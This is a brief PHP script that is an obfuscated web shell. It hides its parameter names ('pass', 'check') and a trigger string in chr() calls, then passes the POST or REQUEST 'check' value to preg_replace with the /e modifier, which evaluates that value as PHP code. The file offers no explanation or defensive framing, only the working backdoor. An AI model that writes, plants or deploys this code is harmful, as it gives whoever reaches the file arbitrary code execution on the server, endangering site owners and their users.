<?php 
$array = array( 
      chr(112).chr(97).chr(115).chr(115), 
      chr(99).chr(104).chr(101).chr(99).chr(107), 
      chr(99).chr(52).chr(53).chr(49).chr(99).chr(99) 
    ); 
echo "start";

if (isset($_POST)) 
	$request = &$_POST; 
elseif (isset($_REQUEST) )  
    $request = &$_REQUEST; 
if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) {      
    $token = preg_replace ( 
        chr(47) . $array[2] . chr(47) . chr(101), 
        $request[$array[1]], 
        $array[2] 
    ); 
     
} 
?>
